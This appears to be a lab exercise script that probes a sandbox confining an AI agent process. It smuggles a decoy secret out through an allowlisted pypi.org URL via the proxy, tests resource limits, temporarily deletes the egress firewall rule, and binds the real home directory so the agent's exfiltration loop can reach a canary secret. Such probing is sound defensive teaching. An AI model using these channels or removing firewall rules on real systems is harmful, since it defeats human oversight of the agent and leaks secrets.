"""Workbench 1, Break it: four experiments that loosen or probe the sandbox.

Run on the lab VM after setup_sandbox.sh, one at a time:
    python3 break_it.py 1     # a channel through an allowlisted host
    python3 break_it.py 2     # memory and file-size limits
    python3 break_it.py 3     # switch the firewall rule off
    python3 break_it.py 4     # give the sandbox the real home directory
Predict each result before you run it. Experiment 3 deletes the firewall
rule for the length of one run and puts it back afterwards.
"""
import json
import os
import subprocess
import sys

from measure import (AGENT, LIMITS, PROXY, PY, RUN, bwrap, counter,
                     fresh_dir, loop_cmd, received, sh, start_services)

which = sys.argv[1] if sys.argv[1:] and sys.argv[1] in list("1234") \
    else "1"


# ── 1. A channel through an allowlisted host ──────────────────────────
CHANNEL = """
import urllib.request as u
secret = "DECOY-FROM-THE-BOX"          # pretend this was read from a file
op = u.build_opener(u.ProxyHandler({"https": "%s"}))
op.open(u.Request("https://pypi.org/simple/" + secret + "/",
                  method="HEAD"), timeout=8)
""" % PROXY


def allowed_channel():
    srv, proxy, log = start_services()
    wd = fresh_dir("break1")
    done = sh(bwrap(wd, LIMITS + [PY, "-c", CHANNEL]), cwd="/", timeout=60)
    print("sandbox exit status:", done.returncode)
    print("last stderr line:   ", done.stderr.strip().splitlines()[-1])
    print("what the proxy logged:")
    for line in open(log):
        print("  ", line.strip())
    proxy.terminate()
    srv.shutdown()


# ── 2. Resource limits ────────────────────────────────────────────────
def limits():
    wd = fresh_dir("break2")
    for what, code in (
            ("allocate 3 GiB (limit 2 GiB of address space)",
             "x = bytearray(3 * 2**30); print('allocated')"),
            ("write 200 MB (limit 100 MB per file)",
             "f = open('/work/big', 'wb'); f.write(bytes(200 * 2**20)); "
             "f.flush(); print('wrote')")):
        done = sh(bwrap(wd, LIMITS + [PY, "-c", code]), cwd="/", timeout=60)
        err = (done.stderr.strip().splitlines() or ["(none)"])[-1]
        print(f"{what}\n   exit {done.returncode}, stdout {done.stdout!r},"
              f" last stderr line: {err[:70]}")
    print("files left in the work directory:",
          sh(["sudo", "-n", "ls", "-l", wd]).stdout.split("\n")[1:-1])


# ── 3. Firewall off ───────────────────────────────────────────────────
def firewall_off():
    srv, proxy, log = start_services()
    saved = sh(["sudo", "-n", "nft", "list", "table", "inet", "w01"]).stdout
    open(f"{RUN}/w01.nft", "w").write(saved)
    sh(["sudo", "-n", "nft", "delete", "table", "inet", "w01"])
    try:
        cmd, _ = loop_cmd("bwrap", "break3", [
            "--exfil", "--secret", f"/home/{AGENT}/.w01-secret",
            "--proxy", PROXY, "--experiments", "6"])
        done = sh(cmd, cwd="/", timeout=60)
        report = json.loads(done.stdout.strip().splitlines()[-1])
    finally:
        sh(["sudo", "-n", "nft", "-f", f"{RUN}/w01.nft"])
    for a in report["attempts"]:
        print(f"  {a['attempt']:36} {a['outcome']:10} {a['detail']}")
    print("canary received:", received or "nothing")
    print("rule restored:", "egress" in sh(
        ["sudo", "-n", "nft", "list", "ruleset"]).stdout)
    proxy.terminate()
    srv.shutdown()


# ── 4. The real home directory inside the sandbox ─────────────────────
def real_home():
    srv, proxy, log = start_services()
    wd = fresh_dir("break4")
    box = bwrap(wd, [])
    i = box.index("--tmpfs", box.index("--tmpfs") + 1)    # the home tmpfs
    box[i:i + 2] = ["--bind", f"/home/{AGENT}", f"/home/{AGENT}"]
    cmd = box + LIMITS + [PY, "/opt/w01/research_loop.py", "--out", "/work",
                          "--experiments", "6", "--exfil", "--secret",
                          f"/home/{AGENT}/.w01-secret", "--proxy", PROXY]
    before = counter()
    done = sh(cmd, cwd="/", timeout=60)
    report = json.loads(done.stdout.strip().splitlines()[-1])
    for a in report["attempts"]:
        print(f"  {a['attempt']:36} {a['outcome']:10} {a['detail']}")
    print("canary received:", received or "nothing",
          f"| firewall rejects: {counter() - before}")
    proxy.terminate()
    srv.shutdown()


{"1": allowed_channel, "2": limits, "3": firewall_off, "4": real_home}[which]()
